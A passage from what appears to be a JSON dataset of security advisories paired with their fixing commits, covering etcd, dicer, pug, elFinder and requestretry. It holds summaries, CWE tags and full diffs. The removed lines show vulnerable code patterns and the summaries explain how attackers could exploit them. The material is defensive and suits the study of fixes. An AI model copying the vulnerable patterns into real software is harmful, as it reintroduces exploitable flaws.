        },
        {
            "index":790,
            "vuln_id":"GHSA-h6xx-pmxh-3wgp",
            "cwe_id":"{'CWE-285', 'CWE-287'}",
            "score":8.1,
            "chain":"{'https:\/\/github.com\/etcd-io\/etcd\/commit\/bf9d0d8291dc71ecbfb2690612954e1a298154b2', 'https:\/\/github.com\/etcd-io\/etcd\/commit\/0191509637546621d6f2e18e074e955ab8ef374d'}",
            "dataset":"osv",
            "summary":"Improper Authentication in etcd etcd versions 3.2.x before 3.2.26 and 3.3.x before 3.3.11 are vulnerable to an improper authentication issue when role-based access control (RBAC) is used and client-cert-auth is enabled. If an etcd client server TLS certificate contains a Common Name (CN) which matches a valid RBAC username, a remote attacker may authenticate as that user with any valid (trusted) client certificate in a REST API request to the gRPC-gateway.",
            "published_date":"2022-02-15",
            "chain_len":2,
            "project":"https:\/\/github.com\/etcd-io\/etcd",
            "commit_href":"https:\/\/github.com\/etcd-io\/etcd\/commit\/bf9d0d8291dc71ecbfb2690612954e1a298154b2",
            "commit_sha":"bf9d0d8291dc71ecbfb2690612954e1a298154b2",
            "patch":"MULTI",
            "chain_ord":"['0191509637546621d6f2e18e074e955ab8ef374d', 'bf9d0d8291dc71ecbfb2690612954e1a298154b2']",
            "before_first_fix_commit":"{'9c6b407e7d45b89c72c45a065294b6eac91888ab'}",
            "last_fix_commit":"bf9d0d8291dc71ecbfb2690612954e1a298154b2",
            "chain_ord_pos":2.0,
            "commit_datetime":"01\/02\/2019, 20:54:40",
            "message":"auth: disable CommonName auth for gRPC-gateway\n\nSigned-off-by: Sam Batschelet <sbatsche@redhat.com>",
            "author":"Sam Batschelet",
            "comments":null,
            "stats":"{'additions': 21, 'deletions': 0, 'total': 21}",
            "files":"{'auth\/store.go': {'additions': 21, 'deletions': 0, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/etcd-io\/etcd\/raw\/bf9d0d8291dc71ecbfb2690612954e1a298154b2\/auth%2Fstore.go', 'patch': '@@ -1166,6 +1166,27 @@ func (as *authStore) AuthInfoFromTLS(ctx context.Context) (ai *AuthInfo) {\\n \\t\\t\\tUsername: chains[0].Subject.CommonName,\\n \\t\\t\\tRevision: as.Revision(),\\n \\t\\t}\\n+\\t\\tmd, ok := metadata.FromIncomingContext(ctx)\\n+\\t\\tif !ok {\\n+\\t\\t\\treturn nil\\n+\\t\\t}\\n+\\n+\\t\\t\/\/ gRPC-gateway proxy request to etcd server includes Grpcgateway-Accept\\n+\\t\\t\/\/ header. The proxy uses etcd client server certificate. If the certificate\\n+\\t\\t\/\/ has a CommonName we should never use this for authentication.\\n+\\t\\tif gw := md[\"grpcgateway-accept\"]; len(gw) > 0 {\\n+\\t\\t\\tif as.lg != nil {\\n+\\t\\t\\t\\tas.lg.Warn(\\n+\\t\\t\\t\\t\\t\"ignoring common name in gRPC-gateway proxy request\",\\n+\\t\\t\\t\\t\\tzap.String(\"common-name\", ai.Username),\\n+\\t\\t\\t\\t\\tzap.String(\"user-name\", ai.Username),\\n+\\t\\t\\t\\t\\tzap.Uint64(\"revision\", ai.Revision),\\n+\\t\\t\\t\\t)\\n+\\t\\t\\t} else {\\n+\\t\\t\\t\\tplog.Warningf(\"ignoring common name in gRPC-gateway proxy request %s\", ai.Username)\\n+\\t\\t\\t}\\n+\\t\\t\\treturn nil\\n+\\t\\t}\\n \\t\\tif as.lg != nil {\\n \\t\\t\\tas.lg.Debug(\\n \\t\\t\\t\\t\"found command name\",'}}",
            "message_norm":"auth: disable commonname auth for grpc-gateway\n\nsigned-off-by: sam batschelet <sbatsche@redhat.com>",
            "language":"en",
            "entities":"[('auth', 'SECWORD', ''), ('auth', 'SECWORD', ''), ('sbatsche@redhat.com', 'EMAIL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['auth\/store.go'])",
            "num_files":1.0,
            "patch_content":"From bf9d0d8291dc71ecbfb2690612954e1a298154b2 Mon Sep 17 00:00:00 2001\nFrom: Sam Batschelet <sbatsche@redhat.com>\nDate: Wed, 2 Jan 2019 15:54:40 -0500\nSubject: [PATCH] auth: disable CommonName auth for gRPC-gateway\n\nSigned-off-by: Sam Batschelet <sbatsche@redhat.com>\n---\n auth\/store.go | 21 +++++++++++++++++++++\n 1 file changed, 21 insertions(+)\n\ndiff --git a\/auth\/store.go b\/auth\/store.go\nindex b3e346b92d6..2e95e0c165b 100644\n--- a\/auth\/store.go\n+++ b\/auth\/store.go\n@@ -1166,6 +1166,27 @@ func (as *authStore) AuthInfoFromTLS(ctx context.Context) (ai *AuthInfo) {\n \t\t\tUsername: chains[0].Subject.CommonName,\n \t\t\tRevision: as.Revision(),\n \t\t}\n+\t\tmd, ok := metadata.FromIncomingContext(ctx)\n+\t\tif !ok {\n+\t\t\treturn nil\n+\t\t}\n+\n+\t\t\/\/ gRPC-gateway proxy request to etcd server includes Grpcgateway-Accept\n+\t\t\/\/ header. The proxy uses etcd client server certificate. If the certificate\n+\t\t\/\/ has a CommonName we should never use this for authentication.\n+\t\tif gw := md[\"grpcgateway-accept\"]; len(gw) > 0 {\n+\t\t\tif as.lg != nil {\n+\t\t\t\tas.lg.Warn(\n+\t\t\t\t\t\"ignoring common name in gRPC-gateway proxy request\",\n+\t\t\t\t\tzap.String(\"common-name\", ai.Username),\n+\t\t\t\t\tzap.String(\"user-name\", ai.Username),\n+\t\t\t\t\tzap.Uint64(\"revision\", ai.Revision),\n+\t\t\t\t)\n+\t\t\t} else {\n+\t\t\t\tplog.Warningf(\"ignoring common name in gRPC-gateway proxy request %s\", ai.Username)\n+\t\t\t}\n+\t\t\treturn nil\n+\t\t}\n \t\tif as.lg != nil {\n \t\t\tas.lg.Debug(\n \t\t\t\t\"found command name\",",
            "code_diff":"@@ -1166,6 +1166,27 @@ func (as *authStore) AuthInfoFromTLS(ctx context.Context) (ai *AuthInfo) {\n \t\t\tUsername: chains[0].Subject.CommonName,\n \t\t\tRevision: as.Revision(),\n \t\t}\n+\t\tmd, ok := metadata.FromIncomingContext(ctx)\n+\t\tif !ok {\n+\t\t\treturn nil\n+\t\t}\n+\n+\t\t\/\/ gRPC-gateway proxy request to etcd server includes Grpcgateway-Accept\n+\t\t\/\/ header. The proxy uses etcd client server certificate. If the certificate\n+\t\t\/\/ has a CommonName we should never use this for authentication.\n+\t\tif gw := md[\"grpcgateway-accept\"]; len(gw) > 0 {\n+\t\t\tif as.lg != nil {\n+\t\t\t\tas.lg.Warn(\n+\t\t\t\t\t\"ignoring common name in gRPC-gateway proxy request\",\n+\t\t\t\t\tzap.String(\"common-name\", ai.Username),\n+\t\t\t\t\tzap.String(\"user-name\", ai.Username),\n+\t\t\t\t\tzap.Uint64(\"revision\", ai.Revision),\n+\t\t\t\t)\n+\t\t\t} else {\n+\t\t\t\tplog.Warningf(\"ignoring common name in gRPC-gateway proxy request %s\", ai.Username)\n+\t\t\t}\n+\t\t\treturn nil\n+\t\t}\n \t\tif as.lg != nil {\n \t\t\tas.lg.Debug(\n \t\t\t\t\"found command name\","
        },
        {
            "index":334,
            "vuln_id":"GHSA-wm7h-9275-46v2",
            "cwe_id":"{'CWE-248'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/mscdex\/dicer\/pull\/22\/commits\/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac'}",
            "dataset":"osv",
            "summary":"Crash in HeaderParser in dicer This affects all versions of package dicer. A malicious attacker can send a modified form to server, and crash the nodejs service. A complete denial of service can be achived by sending the malicious form in a loop.",
            "published_date":"2022-05-21",
            "chain_len":1,
            "project":"https:\/\/github.com\/mscdex\/dicer",
            "commit_href":"https:\/\/github.com\/mscdex\/dicer\/pull\/22\/commits\/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac",
            "commit_sha":"b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac",
            "patch":"SINGLE",
            "chain_ord":"['b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac']",
            "before_first_fix_commit":"{'524254c4af4e8f2ed070facac8f6d91538b41eef'}",
            "last_fix_commit":"b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac",
            "chain_ord_pos":1.0,
            "commit_datetime":"08\/10\/2021, 09:41:48",
            "message":"removed bug caused by uninitialized variable h in function HeaderParser.prototype._parseHeader",
            "author":"Roland Heinze",
            "comments":null,
            "stats":"{'additions': 20, 'deletions': 18, 'total': 38}",
            "files":"{'lib\/HeaderParser.js': {'additions': 20, 'deletions': 18, 'changes': 38, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mscdex\/dicer\/raw\/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac\/lib%2FHeaderParser.js', 'patch': \"@@ -82,26 +82,28 @@ HeaderParser.prototype._parseHeader = function() {\\n       \/\/ folded header content\\n       \/\/ RFC2822 says to just remove the CRLF and not the whitespace following\\n       \/\/ it, so we follow the RFC and include the leading whitespace ...\\n-      this.header[h][this.header[h].length - 1] += lines[i];\\n-    } else {\\n-      m = RE_HDR.exec(lines[i]);\\n-      if (m) {\\n-        h = m[1].toLowerCase();\\n-        if (m[2]) {\\n-          if (this.header[h] === undefined)\\n-            this.header[h] = [m[2]];\\n-          else\\n-            this.header[h].push(m[2]);\\n-        } else\\n-          this.header[h] = [''];\\n-        if (++this.npairs === this.maxHeaderPairs)\\n-          break;\\n-      } else {\\n-        this.buffer = lines[i];\\n-        modded = true;\\n-        break;\\n+      if (h) {\\n+        this.header[h][this.header[h].length - 1] += lines[i];\\n+        continue;\\n       }\\n     }\\n+    m = RE_HDR.exec(lines[i]);\\n+    if (m) {\\n+      h = m[1].toLowerCase();\\n+      if (m[2]) {\\n+        if (this.header[h] === undefined)\\n+          this.header[h] = [m[2]];\\n+        else\\n+          this.header[h].push(m[2]);\\n+      } else\\n+        this.header[h] = [''];\\n+      if (++this.npairs === this.maxHeaderPairs)\\n+        break;\\n+    } else {\\n+      this.buffer = lines[i];\\n+      modded = true;\\n+      break;\\n+    }\\n   }\\n   if (!modded)\\n     this.buffer = '';\"}}",
            "message_norm":"removed bug caused by uninitialized variable h in function headerparser.prototype._parseheader",
            "language":"en",
            "entities":"[('removed', 'ACTION', ''), ('bug', 'FLAW', ''), ('uninitialized', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/HeaderParser.js'])",
            "num_files":1.0,
            "patch_content":"From b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac Mon Sep 17 00:00:00 2001\nFrom: Roland Heinze <heinze@freenet.de>\nDate: Tue, 10 Aug 2021 11:41:48 +0200\nSubject: [PATCH] removed bug caused by uninitialized variable h in function\n HeaderParser.prototype._parseHeader\n\n---\n lib\/HeaderParser.js | 38 ++++++++++++++++++++------------------\n 1 file changed, 20 insertions(+), 18 deletions(-)\n\ndiff --git a\/lib\/HeaderParser.js b\/lib\/HeaderParser.js\nindex 8ccb6e5..ec0ad10 100644\n--- a\/lib\/HeaderParser.js\n+++ b\/lib\/HeaderParser.js\n@@ -82,26 +82,28 @@ HeaderParser.prototype._parseHeader = function() {\n       \/\/ folded header content\n       \/\/ RFC2822 says to just remove the CRLF and not the whitespace following\n       \/\/ it, so we follow the RFC and include the leading whitespace ...\n-      this.header[h][this.header[h].length - 1] += lines[i];\n-    } else {\n-      m = RE_HDR.exec(lines[i]);\n-      if (m) {\n-        h = m[1].toLowerCase();\n-        if (m[2]) {\n-          if (this.header[h] === undefined)\n-            this.header[h] = [m[2]];\n-          else\n-            this.header[h].push(m[2]);\n-        } else\n-          this.header[h] = [''];\n-        if (++this.npairs === this.maxHeaderPairs)\n-          break;\n-      } else {\n-        this.buffer = lines[i];\n-        modded = true;\n-        break;\n+      if (h) {\n+        this.header[h][this.header[h].length - 1] += lines[i];\n+        continue;\n       }\n     }\n+    m = RE_HDR.exec(lines[i]);\n+    if (m) {\n+      h = m[1].toLowerCase();\n+      if (m[2]) {\n+        if (this.header[h] === undefined)\n+          this.header[h] = [m[2]];\n+        else\n+          this.header[h].push(m[2]);\n+      } else\n+        this.header[h] = [''];\n+      if (++this.npairs === this.maxHeaderPairs)\n+        break;\n+    } else {\n+      this.buffer = lines[i];\n+      modded = true;\n+      break;\n+    }\n   }\n   if (!modded)\n     this.buffer = '';",
            "code_diff":"@@ -82,26 +82,28 @@ HeaderParser.prototype._parseHeader = function() {\n       \/\/ folded header content\n       \/\/ RFC2822 says to just remove the CRLF and not the whitespace following\n       \/\/ it, so we follow the RFC and include the leading whitespace ...\n-      this.header[h][this.header[h].length - 1] += lines[i];\n-    } else {\n-      m = RE_HDR.exec(lines[i]);\n-      if (m) {\n-        h = m[1].toLowerCase();\n-        if (m[2]) {\n-          if (this.header[h] === undefined)\n-            this.header[h] = [m[2]];\n-          else\n-            this.header[h].push(m[2]);\n-        } else\n-          this.header[h] = [''];\n-        if (++this.npairs === this.maxHeaderPairs)\n-          break;\n-      } else {\n-        this.buffer = lines[i];\n-        modded = true;\n-        break;\n+      if (h) {\n+        this.header[h][this.header[h].length - 1] += lines[i];\n+        continue;\n       }\n     }\n+    m = RE_HDR.exec(lines[i]);\n+    if (m) {\n+      h = m[1].toLowerCase();\n+      if (m[2]) {\n+        if (this.header[h] === undefined)\n+          this.header[h] = [m[2]];\n+        else\n+          this.header[h].push(m[2]);\n+      } else\n+        this.header[h] = [''];\n+      if (++this.npairs === this.maxHeaderPairs)\n+        break;\n+    } else {\n+      this.buffer = lines[i];\n+      modded = true;\n+      break;\n+    }\n   }\n   if (!modded)\n     this.buffer = '';"
        },
        {
            "index":201,
            "vuln_id":"GHSA-p493-635q-r6gr",
            "cwe_id":"{'CWE-74'}",
            "score":6.8,
            "chain":"{'https:\/\/github.com\/pugjs\/pug\/commit\/991e78f7c4220b2f8da042877c6f0ef5a4683be0'}",
            "dataset":"osv",
            "summary":"Remote code execution via the `pretty` option. ### Impact\n\nIf a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend.\n\n### Patches\n\nUpgrade to `pug@3.0.1` or `pug-code-gen@3.0.2` or `pug-code-gen@2.0.3`, which correctly sanitise the parameter.\n\n### Workarounds\n\nIf there is no way for un-trusted input to be passed to pug as the `pretty` option, e.g. if you compile templates in advance before applying user input to them, you do not need to upgrade.\n\n### References\n\n\nOriginal report: https:\/\/github.com\/pugjs\/pug\/issues\/3312\n\n### For more information\n\nIf you believe you have found other vulnerabilities, please **DO NOT** open an issue. Instead, you can follow the instructions in our [Security Policy](https:\/\/github.com\/pugjs\/pug\/blob\/master\/SECURITY.md)",
            "published_date":"2021-03-03",
            "chain_len":1,
            "project":"https:\/\/github.com\/pugjs\/pug",
            "commit_href":"https:\/\/github.com\/pugjs\/pug\/commit\/991e78f7c4220b2f8da042877c6f0ef5a4683be0",
            "commit_sha":"991e78f7c4220b2f8da042877c6f0ef5a4683be0",
            "patch":"SINGLE",
            "chain_ord":"['991e78f7c4220b2f8da042877c6f0ef5a4683be0']",
            "before_first_fix_commit":"{'06baa525a23049756de9587461d389a12bc12537'}",
            "last_fix_commit":"991e78f7c4220b2f8da042877c6f0ef5a4683be0",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/28\/2021, 18:21:18",
            "message":"fix: sanitise and escape the `pretty` option (#3314)",
            "author":"Forbes Lindesay",
            "comments":null,
            "stats":"{'additions': 11, 'deletions': 2, 'total': 13}",
            "files":"{'packages\/pug-code-gen\/index.js': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pugjs\/pug\/raw\/991e78f7c4220b2f8da042877c6f0ef5a4683be0\/packages%2Fpug-code-gen%2Findex.js', 'patch': '@@ -57,6 +57,11 @@ function Compiler(node, options) {\\n   if (this.pp && typeof this.pp !== \\'string\\') {\\n     this.pp = \\'  \\';\\n   }\\n+  if (this.pp && !\/^\\\\s+$\/.test(this.pp)) {\\n+    throw new Error(\\n+      \\'The pretty parameter should either be a boolean or whitespace only string\\'\\n+    );\\n+  }\\n   this.debug = false !== options.compileDebug;\\n   this.indents = 0;\\n   this.parentIndents = 0;\\n@@ -452,7 +457,9 @@ Compiler.prototype = {\\n   visitMixinBlock: function(block) {\\n     if (this.pp)\\n       this.buf.push(\\n-        \"pug_indent.push(\\'\" + Array(this.indents + 1).join(this.pp) + \"\\');\"\\n+        \\'pug_indent.push(\\' +\\n+          stringify(Array(this.indents + 1).join(this.pp)) +\\n+          \\');\\'\\n       );\\n     this.buf.push(\\'block && block();\\');\\n     if (this.pp) this.buf.push(\\'pug_indent.pop();\\');\\n@@ -504,7 +511,9 @@ Compiler.prototype = {\\n       this.mixins[key].used = true;\\n       if (pp)\\n         this.buf.push(\\n-          \"pug_indent.push(\\'\" + Array(this.indents + 1).join(pp) + \"\\');\"\\n+          \\'pug_indent.push(\\' +\\n+            stringify(Array(this.indents + 1).join(pp)) +\\n+            \\');\\'\\n         );\\n       if (block || attrs.length || attrsBlocks.length) {\\n         this.buf.push(name + \\'.call({\\');'}}",
            "message_norm":"fix: sanitise and escape the `pretty` option (#3314)",
            "language":"en",
            "entities":"[('sanitise', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('#3314', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['packages\/pug-code-gen\/index.js'])",
            "num_files":1.0,
            "patch_content":"From 991e78f7c4220b2f8da042877c6f0ef5a4683be0 Mon Sep 17 00:00:00 2001\nFrom: Forbes Lindesay <forbes@lindesay.co.uk>\nDate: Sun, 28 Feb 2021 18:21:18 +0000\nSubject: [PATCH] fix: sanitise and escape the `pretty` option (#3314)\n\n---\n packages\/pug-code-gen\/index.js | 13 +++++++++++--\n 1 file changed, 11 insertions(+), 2 deletions(-)\n\ndiff --git a\/packages\/pug-code-gen\/index.js b\/packages\/pug-code-gen\/index.js\nindex a75929ce9..de5c70a72 100644\n--- a\/packages\/pug-code-gen\/index.js\n+++ b\/packages\/pug-code-gen\/index.js\n@@ -57,6 +57,11 @@ function Compiler(node, options) {\n   if (this.pp && typeof this.pp !== 'string') {\n     this.pp = '  ';\n   }\n+  if (this.pp && !\/^\\s+$\/.test(this.pp)) {\n+    throw new Error(\n+      'The pretty parameter should either be a boolean or whitespace only string'\n+    );\n+  }\n   this.debug = false !== options.compileDebug;\n   this.indents = 0;\n   this.parentIndents = 0;\n@@ -452,7 +457,9 @@ Compiler.prototype = {\n   visitMixinBlock: function(block) {\n     if (this.pp)\n       this.buf.push(\n-        \"pug_indent.push('\" + Array(this.indents + 1).join(this.pp) + \"');\"\n+        'pug_indent.push(' +\n+          stringify(Array(this.indents + 1).join(this.pp)) +\n+          ');'\n       );\n     this.buf.push('block && block();');\n     if (this.pp) this.buf.push('pug_indent.pop();');\n@@ -504,7 +511,9 @@ Compiler.prototype = {\n       this.mixins[key].used = true;\n       if (pp)\n         this.buf.push(\n-          \"pug_indent.push('\" + Array(this.indents + 1).join(pp) + \"');\"\n+          'pug_indent.push(' +\n+            stringify(Array(this.indents + 1).join(pp)) +\n+            ');'\n         );\n       if (block || attrs.length || attrsBlocks.length) {\n         this.buf.push(name + '.call({');",
            "code_diff":"@@ -57,6 +57,11 @@ function Compiler(node, options) {\n   if (this.pp && typeof this.pp !== 'string') {\n     this.pp = '  ';\n   }\n+  if (this.pp && !\/^\\s+$\/.test(this.pp)) {\n+    throw new Error(\n+      'The pretty parameter should either be a boolean or whitespace only string'\n+    );\n+  }\n   this.debug = false !== options.compileDebug;\n   this.indents = 0;\n   this.parentIndents = 0;\n@@ -452,7 +457,9 @@ Compiler.prototype = {\n   visitMixinBlock: function(block) {\n     if (this.pp)\n       this.buf.push(\n-        \"pug_indent.push('\" + Array(this.indents + 1).join(this.pp) + \"');\"\n+        'pug_indent.push(' +\n+          stringify(Array(this.indents + 1).join(this.pp)) +\n+          ');'\n       );\n     this.buf.push('block && block();');\n     if (this.pp) this.buf.push('pug_indent.pop();');\n@@ -504,7 +511,9 @@ Compiler.prototype = {\n       this.mixins[key].used = true;\n       if (pp)\n         this.buf.push(\n-          \"pug_indent.push('\" + Array(this.indents + 1).join(pp) + \"');\"\n+          'pug_indent.push(' +\n+            stringify(Array(this.indents + 1).join(pp)) +\n+            ');'\n         );\n       if (block || attrs.length || attrsBlocks.length) {\n         this.buf.push(name + '.call({');"
        },
        {
            "index":736,
            "vuln_id":"GHSA-qm58-cvvm-c5qr",
            "cwe_id":"{'CWE-434'}",
            "score":8.1,
            "chain":"{'https:\/\/github.com\/Studio-42\/elFinder\/commit\/75ea92decc16a5daf7f618f85dc621d1b534b5e1'}",
            "dataset":"osv",
            "summary":"elFinder unsafe upload filtering leading to remote code execution ### Impact\n\nBefore elFinder 2.1.58, the upload filter did not disallow the upload of `.phar` files. As several Linux distributions are now shipping Apache configured in a way it will process these files as PHP scripts, attackers could gain arbitrary code execution on the server hosting the PHP connector (even in minimal configuration).\n\n### Patches\n\nThe issue has been addressed with https:\/\/github.com\/Studio-42\/elFinder\/commit\/75ea92decc16a5daf7f618f85dc621d1b534b5e1, associating `.phar` files to the right MIME type. Unless explicitly allowed in the configuration, such files cannot be uploaded anymore. This patch is part of the last release of elFinder, 2.1.58.\n\n### Workarounds\n\nIf you can't update to 2.1.58, make sure your connector is not exposed without authentication.\n\n### Important tips\n\nServer-side scripts can often be created as text files. Currently, elFinder has an appropriate MIME type set for file extensions that are generally runnable on a web server.\n\nHowever, the server has various settings. In some cases, the executable file may be judged as \"text\/plain\". Therefore, elFinder installers should understand the extensions that can be executed on the web server where elFinder is installed, and check if there are any missing items in the elFinder settings.\n\nThe elFinder PHP connector has an option \"additionalMimeMap\" that specifies the MIME type for each extension. See [#3295(comment)](https:\/\/github.com\/Studio-42\/elFinder\/issues\/3295#issuecomment-853042139) for more information.\n\n### References\n\n- https:\/\/snyk.io\/vuln\/composer:studio-42%2Felfinder\n- https:\/\/github.com\/Studio-42\/elFinder\/issues\/3295\n- Further technical details will be disclosed on https:\/\/blog.sonarsource.com\/tag\/security after some time.\n\n### For more information\n\nIf you have any questions or comments about this advisory, you can contact:\n- The original reporters, by sending an email to  support [at] snyk.io or vulnerability.research [at] sonarsource.com;\n- The maintainers, by opening an issue on this repository.",
            "published_date":"2021-06-15",
            "chain_len":1,
            "project":"https:\/\/github.com\/Studio-42\/elFinder",
            "commit_href":"https:\/\/github.com\/Studio-42\/elFinder\/commit\/75ea92decc16a5daf7f618f85dc621d1b534b5e1",
            "commit_sha":"75ea92decc16a5daf7f618f85dc621d1b534b5e1",
            "patch":"SINGLE",
            "chain_ord":"['75ea92decc16a5daf7f618f85dc621d1b534b5e1']",
            "before_first_fix_commit":"{'6a97635e590b5882bf95f62f8e70e7230bbc625e'}",
            "last_fix_commit":"75ea92decc16a5daf7f618f85dc621d1b534b5e1",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/31\/2021, 11:50:39",
            "message":"[VD:abstract] add `'phar:*' => 'text\/x-php'` into 'staticMineMap'\n\nrel. #3295",
            "author":"nao-pon",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 0, 'total': 1}",
            "files":"{'php\/elFinderVolumeDriver.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Studio-42\/elFinder\/raw\/75ea92decc16a5daf7f618f85dc621d1b534b5e1\/php%2FelFinderVolumeDriver.class.php', 'patch': \"@@ -281,6 +281,7 @@ abstract class elFinderVolumeDriver\\n             'php5:*' => 'text\/x-php',\\n             'php7:*' => 'text\/x-php',\\n             'phtml:*' => 'text\/x-php',\\n+            'phar:*' => 'text\/x-php',\\n             'cgi:*' => 'text\/x-httpd-cgi',\\n             'pl:*' => 'text\/x-perl',\\n             'asp:*' => 'text\/x-asap',\"}}",
            "message_norm":"[vd:abstract] add `'phar:*' => 'text\/x-php'` into 'staticminemap'\n\nrel. #3295",
            "language":"en",
            "entities":"[('add', 'ACTION', ''), ('#3295', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['php\/elFinderVolumeDriver.class.php'])",
            "num_files":1.0,
            "patch_content":"From 75ea92decc16a5daf7f618f85dc621d1b534b5e1 Mon Sep 17 00:00:00 2001\nFrom: nao-pon <hypweb@gmail.com>\nDate: Mon, 31 May 2021 20:50:39 +0900\nSubject: [PATCH] [VD:abstract] add `'phar:*' => 'text\/x-php'` into\n 'staticMineMap'\n\nrel. #3295\n---\n php\/elFinderVolumeDriver.class.php | 1 +\n 1 file changed, 1 insertion(+)\n\ndiff --git a\/php\/elFinderVolumeDriver.class.php b\/php\/elFinderVolumeDriver.class.php\nindex 3dd3389a39..b4e364a39b 100644\n--- a\/php\/elFinderVolumeDriver.class.php\n+++ b\/php\/elFinderVolumeDriver.class.php\n@@ -281,6 +281,7 @@ abstract class elFinderVolumeDriver\n             'php5:*' => 'text\/x-php',\n             'php7:*' => 'text\/x-php',\n             'phtml:*' => 'text\/x-php',\n+            'phar:*' => 'text\/x-php',\n             'cgi:*' => 'text\/x-httpd-cgi',\n             'pl:*' => 'text\/x-perl',\n             'asp:*' => 'text\/x-asap',",
            "code_diff":"@@ -281,6 +281,7 @@ abstract class elFinderVolumeDriver\n             'php5:*' => 'text\/x-php',\n             'php7:*' => 'text\/x-php',\n             'phtml:*' => 'text\/x-php',\n+            'phar:*' => 'text\/x-php',\n             'cgi:*' => 'text\/x-httpd-cgi',\n             'pl:*' => 'text\/x-perl',\n             'asp:*' => 'text\/x-asap',"
        },
        {
            "index":99,
            "vuln_id":"GHSA-hjp8-2cm3-cc45",
            "cwe_id":"{'CWE-200'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/fgribreau\/node-request-retry\/commit\/0979c6001d9d57c2aac3157c11b007397158922a'}",
            "dataset":"osv",
            "summary":"Cookie exposure in requestretry Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository fgribreau\/node-request-retry prior to 7.0.0 via cookies being leaked to external sites.",
            "published_date":"2022-02-24",
            "chain_len":1,
            "project":"https:\/\/github.com\/fgribreau\/node-request-retry",
            "commit_href":"https:\/\/github.com\/fgribreau\/node-request-retry\/commit\/0979c6001d9d57c2aac3157c11b007397158922a",
            "commit_sha":"0979c6001d9d57c2aac3157c11b007397158922a",
            "patch":"SINGLE",
            "chain_ord":"['0979c6001d9d57c2aac3157c11b007397158922a']",
            "before_first_fix_commit":"{'5e1a63c13c9b65ed927e8eb797d8cc7da0dae243'}",
            "last_fix_commit":"0979c6001d9d57c2aac3157c11b007397158922a",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/15\/2022, 20:20:12",
            "message":"Prevent Cookie & Authorization Headers from being forwarded when the URL redirects to another domain (information leak) #137",
            "author":"Timothee Desurmont",
            "comments":null,
            "stats":"{'additions': 39, 'deletions': 1, 'total': 40}",
            "files":"{'index.js': {'additions': 39, 'deletions': 1, 'changes': 40, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FGRibreau\/node-request-retry\/raw\/0979c6001d9d57c2aac3157c11b007397158922a\/index.js', 'patch': '@@ -11,6 +11,8 @@ var extend = require(\\'extend\\');\\n var request = require(\\'request\\');\\n var RetryStrategies = require(\\'.\/strategies\\');\\n var _ = require(\\'lodash\\');\\n+var url = require(\\'url\\');\\n+var querystring = require(\"querystring\");\\n \\n var DEFAULTS = {\\n   maxAttempts: 5, \/\/ try 5 times\\n@@ -24,6 +26,42 @@ function defaultPromiseFactory(resolver) {\\n   return new Promise(resolver);\\n }\\n \\n+\/\/ Prevent Cookie & Authorization Headers from being forwarded \\n+\/\/ when the URL redirects to another domain (information leak) #137 \\n+function sanitizeHeaders(options) {\\n+  \\n+  const HEADERS_TO_IGNORE = [\"cookie\", \"authorization\"];\\n+\\n+  const urlObject = url.parse(options.url)\\n+  const queryObject = querystring.parse(urlObject.query);\\n+  \\n+  const hasExternalLink = Object.keys(queryObject).reduce(function(acc, cur) {\\n+    \\n+    let qUrl = url.parse(queryObject[cur]);\\n+\\n+    \/\/ external link if protocol || host || port is different\\n+    if(!!qUrl.host && (qUrl.protocol !== urlObject.protocol || qUrl.host !== urlObject.host || qUrl.port !== urlObject.port) ) {\\n+      acc = true;\\n+    }\\n+    \\n+    return acc;\\n+\\n+  }, false);\\n+\\n+  if (hasExternalLink && options.hasOwnProperty(\"headers\") && typeof(options.headers) === \"object\") {\\n+    \\n+    \/\/ if External Link: remove Cookie and Authorization from Headers\\n+    Object.keys(options.headers).filter(function(key) {\\n+      return HEADERS_TO_IGNORE.includes(key.toLowerCase())\\n+    }).map(function(key) {\\n+      return delete options.headers[key]\\n+    });\\n+\\n+  }\\n+\\n+  return options;\\n+}\\n+\\n function _cloneOptions(options) {\\n   const cloned = {};\\n   for (let key in options) {\\n@@ -85,7 +123,7 @@ function Request(url, options, f, retryConfig) {\\n    * Option object\\n    * @type {Object}\\n    *\/\\n-  this.options = options;\\n+  this.options = sanitizeHeaders(options);\\n \\n   \/**\\n    * Return true if the request should be retried'}}",
            "message_norm":"prevent cookie & authorization headers from being forwarded when the url redirects to another domain (information leak) #137",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('cookie', 'SECWORD', ''), ('information leak', 'SECWORD', ''), ('#137', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['index.js'])",
            "num_files":1.0,
